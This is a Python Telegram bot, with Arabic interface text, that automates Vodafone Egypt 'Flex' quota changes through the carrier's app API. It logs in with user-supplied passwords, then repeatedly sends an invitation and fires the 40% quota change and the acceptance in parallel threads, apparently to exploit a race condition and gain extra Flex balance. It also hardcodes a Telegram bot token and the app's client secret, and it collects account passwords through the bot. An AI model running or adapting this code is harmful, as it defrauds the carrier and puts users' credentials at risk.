import requests
import json
import time
import sys
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import asyncio
import logging

# Fix Unicode encoding for Windows
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except:
        pass

# إعدادات التسجيل
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# توكن البوت - ضع التوكن هنا
BOT_TOKEN = "8398810837:AAH7PICXbCTaABiM9YeXMYHb16V6XBQN0zA"

# ألوان للطباعة في الكونسول
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# حالة المستخدمين
user_sessions = {}

class UserSession:
    def __init__(self):
        self.number_owner = None
        self.password_owner = None
        self.frist_number = None
        self.number_2 = None
        self.password_number_2 = None
        self.is_running = False
        self.counter = 1
        self.successful_cycles = 0
        self.current_operation = None
        self.data_step = 0
        self.waiting_for_input = False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """بدء البوت وعرض القائمة الرئيسية"""
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession()
    
    keyboard = [
        [InlineKeyboardButton("📝 إدخال البيانات", callback_data="input_data")],
        [InlineKeyboardButton("▶️ بدء التشغيل", callback_data="start_operation")],
        [InlineKeyboardButton("⏹️ إيقاف التشغيل", callback_data="stop_operation")],
        [InlineKeyboardButton("📊 حالة التشغيل", callback_data="status")],
        [InlineKeyboardButton("🆘 المساعدة", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = """
🕌 *مرحباً بك في بوت فودافون فليكس* 🕌

*ﷺ صلي علي سيدنا محمد ﷺ*
*اذكر الله*

📋 *الخيارات المتاحة:*
• 📝 إدخال البيانات: إدخال أرقام وكلمات المرور
• ▶️ بدء التشغيل: بدء عملية الفليكس
• ⏹️ إيقاف التشغيل: إيقاف العملية
• 📊 حالة التشغيل: عرض الإحصائيات
• 🆘 المساعدة: عرض التعليمات

*مبرمج البوت: Mr seif ragabe*
    """
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الأزرار"""
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession()
    
    session = user_sessions[user_id]
    
    if query.data == "input_data":
        await input_data_handler(query, context, session)
    elif query.data == "start_operation":
        await start_operation_handler(query, context, session)
    elif query.data == "stop_operation":
        await stop_operation_handler(query, context, session)
    elif query.data == "status":
        await status_handler(query, context, session)
    elif query.data == "help":
        await help_handler(query, context)

async def input_data_handler(query, context, session):
    """معالجة إدخال البيانات"""
    session.current_operation = "input_data"
    session.data_step = 1
    session.waiting_for_input = True
    
    text = """
📝 *مرحلة إدخال البيانات*

أدخل البيانات بالترتيب التالي:

1. *رقم المالك:* 
   - الرقم الرئيسي لحساب فودافون
   - مثال: 01012345678

*الرجاء إدخال رقم المالك:*
"""
    
    keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الرسائل النصية"""
    user_id = update.effective_user.id
    message_text = update.message.text
    
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession()
    
    session = user_sessions[user_id]
    
    if session.waiting_for_input and session.current_operation == "input_data":
        await process_data_input(update, context, session, message_text)
    else:
        await update.message.reply_text("❌ لا يوجد عملية إدخال بيانات نشطة. استخدم /start للبدء")

async def process_data_input(update: Update, context: ContextTypes.DEFAULT_TYPE, session: UserSession, message_text: str):
    """معالجة إدخال البيانات خطوة بخطوة"""
    try:
        if session.data_step == 1:  # رقم المالك
            session.number_owner = message_text
            session.data_step = 2
            await update.message.reply_text("🔐 *الآن أدخل كلمة سر المالك:*", parse_mode='Markdown')
            
        elif session.data_step == 2:  # كلمة سر المالك
            session.password_owner = message_text
            session.data_step = 3
            await update.message.reply_text("📱 *الآن أدخل الرقم الثابت:*", parse_mode='Markdown')
            
        elif session.data_step == 3:  # الرقم الثابت
            session.frist_number = message_text
            session.data_step = 4
            await update.message.reply_text("📲 *الآن أدخل الرقم الطاير:*", parse_mode='Markdown')
            
        elif session.data_step == 4:  # الرقم الطاير
            session.number_2 = message_text
            session.data_step = 5
            await update.message.reply_text("🔑 *الآن أدخل كلمة سر الطاير:*", parse_mode='Markdown')
            
        elif session.data_step == 5:  # كلمة سر الطاير
            session.password_number_2 = message_text
            session.waiting_for_input = False
            session.data_step = 0
            
            # تأكيد حفظ البيانات
            summary_text = f"""
✅ *تم حفظ البيانات بنجاح!*

📋 *البيانات المدخلة:*
• 👑 رقم المالك: `{session.number_owner}`
• 🔐 كلمة سر المالك: `{"*" * len(session.password_owner)}`
• 📱 الرقم الثابت: `{session.frist_number}`
• 📲 الرقم الطاير: `{session.number_2}`
• 🔑 كلمة سر الطاير: `{"*" * len(session.password_number_2)}`

يمكنك الآن بدء التشغيل 🚀
"""
            keyboard = [
                [InlineKeyboardButton("▶️ بدء التشغيل", callback_data="start_operation")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(summary_text, reply_markup=reply_markup, parse_mode='Markdown')
            
    except Exception as e:
        await update.message.reply_text(f"❌ حدث خطأ أثناء حفظ البيانات: {str(e)}")
        session.waiting_for_input = False
        session.data_step = 0

async def start_operation_handler(query, context, session):
    """بدء عملية التشغيل"""
    if not session.number_owner or not session.password_owner:
        await query.edit_message_text(
            "❌ *يجب إدخال البيانات أولاً*\n\nاستخدم زر '📝 إدخال البيانات' لإدخال البيانات المطلوبة.",
            parse_mode='Markdown'
        )
        return
    
    session.is_running = True
    await query.edit_message_text("🚀 *بدأ التشغيل...*\n\nسيتم بدء الدورات تلقائياً.", parse_mode='Markdown')
    
    # بدء التشغيل في thread منفصل
    threading.Thread(target=run_operation, args=(session, context, query.from_user.id)).start()

async def stop_operation_handler(query, context, session):
    """إيقاف عملية التشغيل"""
    session.is_running = False
    await query.edit_message_text(
        f"⏹️ *تم إيقاف التشغيل*\n\n📊 إحصائيات الأخيرة:\n• عدد الدورات الناجحة: {session.successful_cycles}",
        parse_mode='Markdown'
    )

async def status_handler(query, context, session):
    """عرض حالة التشغيل"""
    status_text = "🟢 قيد التشغيل" if session.is_running else "🔴 متوقف"
    
    text = f"""
📊 *حالة التشغيل*

• **الحالة:** {status_text}
• **عدد الدورات:** {session.counter}
• **الدورات الناجحة:** {session.successful_cycles}

📋 **البيانات المدخلة:**
• المالك: `{session.number_owner or 'غير مدخل'}`
• الرقم الثابت: `{session.frist_number or 'غير مدخل'}`
• الرقم الطاير: `{session.number_2 or 'غير مدخل'}`
"""
    keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def help_handler(query, context):
    """عرض التعليمات"""
    help_text = """
🆘 *تعليمات استخدام البوت*

📋 *الخطوات:*
1. إدخال البيانات (الأرقام وكلمات السر)
2. بدء التشغيل
3. البوت سيعمل تلقائياً

⚠️ *ملاحظات مهمة:*
• تأكد من صحة البيانات المدخلة
• البوت يحتاج اتصال إنترنت مستقر
• قد تستغرق العملية بعض الوقت

🛠 *للدعم:*
مبرمج البوت: Mr seif ragabe
"""
    keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(help_text, reply_markup=reply_markup, parse_mode='Markdown')

async def send_telegram_message(context, user_id, message):
    """إرسال رسالة إلى المستخدم عبر التليجرام"""
    try:
        await context.bot.send_message(chat_id=user_id, text=message, parse_mode='Markdown')
    except Exception as e:
        print(f"Error sending message: {e}")

# الدوال الأصلية من الكود (مع تعديلات طفيفة)
def login_request(number_owner, password_owner, show_message=True):
    """تسجيل الدخول"""
    try:
        url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
        payload = {
            'grant_type': "password",
            'username': number_owner,
            'password': password_owner,
            'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
            'client_id': "ana-vodafone-app"
        }
        headers = {
            'User-Agent': "okhttp/4.11.0",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'silentLogin': "false",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'Accept-Language': "ar",
            'x-agent-device': "Xiaomi M2101K7BG",
            'x-agent-version': "2024.11.2",
            'x-agent-build': "944",
            'digitalId': "24XDJP9X62I5I"
        }

        response = requests.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code != 200:
            return None

        data = response.json()
        TOKEN = data.get("access_token")
        return TOKEN

    except Exception as e:
        return None

def flex_balance_request(TOKEN, number_owner):
    """الحصول على رصيد الفلكسات"""
    try:
        url = f"https://web.vodafone.com.eg/services/dxl/usage/usageConsumptionReport?bucket.product.publicIdentifier={number_owner}&@type=aggregated"
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Authorization': f"Bearer {TOKEN}",
            'Accept-Language': "AR",
            'msisdn': number_owner,
            'clientId': "WebsiteConsumer",
            'Content-Type': "application/json",
            'Referer': "https://web.vodafone.com.eg/spa/myHome",
        }

        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            for item in data:
                if item.get("@type") == "OTHERS":
                    for bucket in item.get("bucket", []):
                        for product in bucket.get("product", []):
                            if product.get("id") == "Next_Cycle_Quota":
                                bucket_balance = bucket.get("bucketBalance", [])
                                if bucket_balance and len(bucket_balance) > 0:
                                    remaining_value = bucket_balance[0].get("remainingValue", {})
                                    flex_count = remaining_value.get("amount", 0)
                                    return flex_count
            return 0
        else:
            return 0
    except Exception as e:
        return 0

def change_percentage_10(TOKEN, number_owner, frist_number):
    """تغيير النسبة إلى 10%"""
    try:
        url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"

        payload_10 = {
            "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
            "createdBy": {"value": "MobileApp"},
            "parts": {
                "characteristicsValue": {
                    "characteristicsValue": [{"characteristicName": "quotaDist1", "type": "percentage", "value": "10"}]
                },
                "member": [
                    {"id": [{"schemeName": "MSISDN", "value": number_owner}], "type": "Owner"},
                    {"id": [{"schemeName": "MSISDN", "value": frist_number}], "type": "Member"}
                ]
            },
            "type": "QuotaRedistribution"
        }

        headers = {
            'User-Agent': "okhttp/4.11.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'x-dynatrace': "MT_3_5_1750087222_5-0_a556db1b-4506-43f3-854a-1d2527767923_0_1930_592",
            'Authorization': f"Bearer {TOKEN}",
            'api-version': "v2",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Xiaomi M2101K7BG",
            'x-agent-version': "2024.11.2",
            'x-agent-build': "944",
            'msisdn': number_owner,
            'Accept-Language': "ar"
        }

        response = requests.patch(url, data=json.dumps(payload_10), headers=headers, timeout=10)
        return response.status_code in [200, 201]
            
    except Exception as e:
        return False

def send_invitation(TOKEN, number_owner, number_2):
    """إرسال دعوة للعضو الطاير"""
    try:
        url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"

        payload_invite = {
            "category": [
                {"listHierarchyId": "PackageID", "value": "523"},
                {"listHierarchyId": "TemplateID", "value": "47"},
                {"listHierarchyId": "TierID", "value": "523"}
            ],
            "parts": {
                "characteristicsValue": {
                    "characteristicsValue": [
                        {"characteristicName": "quotaDist1", "type": "percentage", "value": "10"}
                    ]
                },
                "member": [
                    {"id": [{"schemeName": "MSISDN", "value": number_owner}], "type": "Owner"},
                    {"id": [{"schemeName": "MSISDN", "value": number_2}], "type": "Member"}
                ]
            },
            "type": "SendInvitation"
        }

        headers = {
            'User-Agent': "okhttp/4.11.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'Authorization': f"Bearer {TOKEN}",
            'api-version': "v2",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Xiaomi M2101K7BG",
            'x-agent-version': "2024.11.2",
            'x-agent-build': "944",
            'msisdn': number_owner,
            'Accept-Language': "ar"
        }

        response = requests.post(url, data=json.dumps(payload_invite), headers=headers, timeout=10)
        return response.status_code in [200, 201]
            
    except Exception as e:
        return False

def accept_invitation(TOKEN_2, number_owner, number_2):
    """قبول الدعوة"""
    try:
        url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"

        payload_accept = {
            "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
            "name": "FlexFamily",
            "parts": {
                "member": [
                    {"id": [{"schemeName": "MSISDN", "value": number_owner}], "type": "Owner"},
                    {"id": [{"schemeName": "MSISDN", "value": number_2}], "type": "Member"}
                ]
            },
            "type": "AcceptInvitation"
        }

        headers_accept = {
            'User-Agent': "okhttp/4.11.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'api_id': "APP",
            'x-dynatrace': "MT_3_5_1750087222_5-0_a556db1b-4506-43f3-854a-1d2527767923_0_1931_483",
            'Authorization': f"Bearer {TOKEN_2}",
            'api-version': "v2",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Xiaomi M2101K7BG",
            'x-agent-version': "2024.11.2",
            'x-agent-build': "944",
            'msisdn': number_2,
            'Accept-Language': "ar"
        }

        response = requests.patch(url, data=json.dumps(payload_accept), headers=headers_accept, timeout=10)
        return response.status_code in [200, 201]
            
    except Exception as e:
        return False

def change_percentage_40(TOKEN, number_owner, frist_number):
    """تغيير النسبة إلى 40%"""
    try:
        url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"

        payload_40 = {
            "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
            "createdBy": {"value": "MobileApp"},
            "parts": {
                "characteristicsValue": {
                    "characteristicsValue": [{"characteristicName": "quotaDist1", "type": "percentage", "value": "40"}]
                },
                "member": [
                    {"id": [{"schemeName": "MSISDN", "value": number_owner}], "type": "Owner"},
                    {"id": [{"schemeName": "MSISDN", "value": frist_number}], "type": "Member"}
                ]
            },
            "type": "QuotaRedistribution"
        }

        headers_40 = {
            'User-Agent': "okhttp/4.11.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'x-dynatrace': "MT_3_5_1750087222_5-0_a556db1b-4506-43f3-854a-1d2527767923_0_1930_592",
            'Authorization': f"Bearer {TOKEN}",
            'api-version': "v2",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Xiaomi M2101K7BG",
            'x-agent-version': "2024.11.2",
            'x-agent-build': "944",
            'msisdn': number_owner,
            'Accept-Language': "ar"
        }

        response_40 = requests.patch(url, data=json.dumps(payload_40), headers=headers_40, timeout=10)
        return response_40.status_code in [200, 201]
            
    except Exception as e:
        return False

def remove_member(TOKEN, number_owner, number_2):
    """إزالة العضو الطاير"""
    try:
        url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"

        payload_remove = {
            "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
            "createdBy": {"value": "MobileApp"},
            "parts": {
                "characteristicsValue": {
                    "characteristicsValue": [
                        {"characteristicName": "Disconnect", "value": "0"},
                        {"characteristicName": "LastMemberDeletion", "value": "1"}
                    ]
                },
                "member": [
                    {"id": [{"schemeName": "MSISDN", "value": number_owner}], "type": "Owner"},
                    {"id": [{"schemeName": "MSISDN", "value": number_2}], "type": "Member"}
                ]
            },
            "type": "FamilyRemoveMember"
        }

        headers_remove = {
            'User-Agent': "okhttp/4.11.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'Authorization': f"Bearer {TOKEN}",
            'api-version': "v2",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Xiaomi M2101K7BG",
            'x-agent-version': "2024.11.2",
            'x-agent-build': "944",
            'msisdn': number_owner,
            'Accept-Language': "ar"
        }

        response = requests.patch(url, data=json.dumps(payload_remove), headers=headers_remove, timeout=10)
        return response.status_code in [200, 201]
            
    except Exception as e:
        return False

def retry_operation(operation_func, max_retries=2, *args, **kwargs):
    """إعادة المحاولة"""
    for attempt in range(max_retries + 1):
        try:
            result = operation_func(*args, **kwargs)
            if result:
                return result
        except Exception as e:
            pass
        
        if attempt < max_retries:
            time.sleep(2)
    
    return False

def run_operation(session, context, user_id):
    """تشغيل العملية الرئيسية"""
    async def async_operation():
        while session.is_running:
            try:
                # إرسال بداية الدورة
                await send_telegram_message(context, user_id, f"🔄 *بداية الدورة #{session.counter}*")
                
                TOKEN = None
                TOKEN_2 = None

                # الخطوة 1: تسجيل الدخول
                TOKEN = retry_operation(login_request, 2, session.number_owner, session.password_owner, True)
                if TOKEN:
                    await send_telegram_message(context, user_id, "✅ تسجيل الدخول: تم بنجاح")
                else:
                    await send_telegram_message(context, user_id, "⚠️ تسجيل الدخول: فشل، نكمل")

                time.sleep(2)

                # الخطوة 2: تغيير النسبة إلى 10%
                if TOKEN:
                    if retry_operation(change_percentage_10, 2, TOKEN, session.number_owner, session.frist_number):
                        await send_telegram_message(context, user_id, f"✅ تغيير النسبة: {session.frist_number} → 10%")
                    else:
                        await send_telegram_message(context, user_id, "⚠️ تغيير النسبة: فشل، نكمل")

                # الانتظار
                await send_telegram_message(context, user_id, "⏰ انتظار: 320 ثانية")
                for i in range(320, 0, -60):
                    if not session.is_running:
                        break
                    if i % 60 == 0:
                        await send_telegram_message(context, user_id, f"⏳ متبقي: {i} ثانية")
                    time.sleep(60)

                if not session.is_running:
                    break

                # الخطوة 3: إرسال الدعوة
                TOKEN = retry_operation(login_request, 2, session.number_owner, session.password_owner, False)
                if TOKEN:
                    if retry_operation(send_invitation, 2, TOKEN, session.number_owner, session.number_2):
                        await send_telegram_message(context, user_id, f"✅ إرسال الدعوة: {session.number_2}")
                    else:
                        await send_telegram_message(context, user_id, "⚠️ إرسال الدعوة: فشل، نكمل")

                time.sleep(10)

                # الخطوة 4: تسجيل دخول العضو الطاير
                try:
                    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
                    payload = {
                        'grant_type': "password",
                        'username': session.number_2,
                        'password': session.password_number_2,
                        'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
                        'client_id': "ana-vodafone-app"
                    }
                    headers = {
                        'User-Agent': "okhttp/4.11.0",
                        'Accept': "application/json, text/plain, */*",
                        'Accept-Encoding': "gzip",
                        'silentLogin': "false",
                        'x-agent-operatingsystem': "13",
                        'clientId': "AnaVodafoneAndroid",
                        'Accept-Language': "ar",
                        'x-agent-device': "Xiaomi M2101K7BG",
                        'x-agent-version': "2024.11.2",
                        'x-agent-build': "944",
                        'digitalId': "24XDJP9X62I5I"
                    }
                    response = requests.post(url, data=payload, headers=headers, timeout=10)
                    if response.status_code == 200:
                        data_2 = response.json()
                        TOKEN_2 = data_2.get("access_token")
                        if TOKEN_2:
                            await send_telegram_message(context, user_id, "✅ تسجيل دخول العضو الطاير: تم")
                        else:
                            await send_telegram_message(context, user_id, "⚠️ تسجيل دخول العضو الطاير: فشل")
                    else:
                        await send_telegram_message(context, user_id, "⚠️ تسجيل دخول العضو الطاير: فشل")
                except:
                    await send_telegram_message(context, user_id, "⚠️ تسجيل دخول العضو الطاير: فشل")

                # الخطوة 5: التنفيذ المتزامن
                time.sleep(10)
                TOKEN = retry_operation(login_request, 2, session.number_owner, session.password_owner, False)
                
                if TOKEN and TOKEN_2:
                    # تنفيذ متزامن مبسط
                    change_success = False
                    accept_success = False
                    
                    def send_change():
                        nonlocal change_success
                        change_success = change_percentage_40(TOKEN, session.number_owner, session.frist_number)
                    
                    def send_accept():
                        nonlocal accept_success
                        accept_success = accept_invitation(TOKEN_2, session.number_owner, session.number_2)
                    
                    with ThreadPoolExecutor(max_workers=2) as executor:
                        future1 = executor.submit(send_change)
                        future2 = executor.submit(send_accept)
                        future1.result()
                        future2.result()
                    
                    if change_success:
                        await send_telegram_message(context, user_id, f"✅ تغيير النسبة: {session.frist_number} → 40%")
                    else:
                        await send_telegram_message(context, user_id, "❌ تغيير النسبة: فشل")
                    
                    if accept_success:
                        await send_telegram_message(context, user_id, f"✅ قبول الدعوة: {session.number_2}")
                    else:
                        await send_telegram_message(context, user_id, "❌ قبول الدعوة: فشل")

                # الخطوة 6: جلب الرصيد
                time.sleep(5)
                TOKEN = retry_operation(login_request, 2, session.number_owner, session.password_owner, False)
                if TOKEN:
                    flex_balance = flex_balance_request(TOKEN, session.number_owner)
                    await send_telegram_message(context, user_id, f"💰 الرصيد: {flex_balance:,}")

                # الخطوة 7: إزالة العضو
                time.sleep(5)
                TOKEN = retry_operation(login_request, 2, session.number_owner, session.password_owner, False)
                if TOKEN:
                    if retry_operation(remove_member, 2, TOKEN, session.number_owner, session.number_2):
                        await send_telegram_message(context, user_id, f"✅ حذف العضو: {session.number_2}")
                    else:
                        await send_telegram_message(context, user_id, "⚠️ حذف العضو: فشل")

                # الانتظار للدورة التالية
                await send_telegram_message(context, user_id, "⏰ انتظار للدورة التالية: 320 ثانية")
                for i in range(320, 0, -60):
                    if not session.is_running:
                        break
                    if i % 60 == 0:
                        await send_telegram_message(context, user_id, f"⏳ متبقي: {i} ثانية")
                    time.sleep(60)

                session.successful_cycles += 1
                session.counter += 1
                
                if session.is_running:
                    await send_telegram_message(context, user_id, f"📊 إحصائيات: {session.successful_cycles} دورات ناجحة")

            except Exception as e:
                await send_telegram_message(context, user_id, f"❌ خطأ في الدورة: {str(e)}")
                time.sleep(10)
                if session.is_running:
                    session.counter += 1

    # تشغيل العملية
    asyncio.run(async_operation())

def main():
    """الدالة الرئيسية لتشغيل البوت"""
    # Fix Unicode encoding for Windows (additional safety)
    if sys.platform == "win32":
        try:
            sys.stdout.reconfigure(encoding='utf-8')
        except:
            pass
    
    # إنشاء التطبيق
    application = Application.builder().token(BOT_TOKEN).build()
    
    # إضافة handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # بدء البوت
    print("🤖 بوت فودافون فليكس يعمل الآن...")
    print("🔗 رابط البوت: سيظهر بعد التهيئة الكاملة")
    
    # الحصول على معلومات البوت بعد التهيئة
    async def post_init(application):
        try:
            bot_info = await application.bot.get_me()
            print(f"🔗 رابط البوت: https://t.me/{bot_info.username}")
            print(f"👤 اسم البوت: {bot_info.first_name}")
        except Exception as e:
            print(f"⚠️ لا يمكن الحصول على معلومات البوت: {e}")
    
    # تشغيل البوت مع التهيئة
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        # تهيئة التطبيق
        loop.run_until_complete(application.initialize())
        # الحصول على معلومات البوت
        loop.run_until_complete(post_init(application))
        # بدء البوت
        print("🔄 بدء استقبال الرسائل...")
        application.run_polling()
    except KeyboardInterrupt:
        print("⏹️ إيقاف البوت...")
    except Exception as e:
        print(f"❌ خطأ: {e}")
    finally:
        loop.close()

if __name__ == "__main__":
    main()